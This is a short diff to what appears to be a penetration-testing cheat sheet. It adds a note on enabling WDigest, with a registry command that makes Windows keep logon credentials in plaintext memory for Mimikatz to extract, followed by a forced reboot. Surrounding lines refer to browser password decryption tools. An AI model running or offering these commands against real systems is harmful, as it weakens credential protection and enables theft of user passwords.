@@ -2340,6 +2340,13 @@ $ python3.9 firefox_decrypt.py
 [$ python3.9 firefox_decrypt.py](https://github.com/ohyicong/decrypt-chrome-passwords)
 ```
 
+- Enable WDigest which user credentials in plaintext within memory, making them accessible to tools like Mimikatz for extraction
+
+```
+PS C:\> reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+PS C:\> shutdown.exe /r /t 0 /f
+``` 
+
 - Mimikatz
 
 ```
